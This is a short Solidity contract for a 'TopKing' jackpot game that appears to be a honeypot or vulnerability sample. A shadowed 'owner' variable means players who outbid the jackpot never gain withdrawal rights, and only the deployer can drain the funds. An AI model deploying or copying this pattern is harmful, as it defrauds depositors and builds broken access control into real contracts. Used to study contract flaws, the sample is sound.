 

pragma solidity ^0.4.11;

 
 
 

contract Owned {
    address owner;

    function Owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner{
        if (msg.sender != owner)
            revert();
            _;
    }
}

contract TopKing is Owned {
    address public owner;
    uint public jackpot;
    uint public withdrawDelay;

    function() public payable {
         
        if (msg.value > jackpot) {
            owner = msg.sender;
            withdrawDelay = block.timestamp + 5 days;
        }
        jackpot+=msg.value;
    }

    function takeAll() public onlyOwner {
        require(block.timestamp >= withdrawDelay);
        msg.sender.transfer(this.balance);
        jackpot=0;
    }
}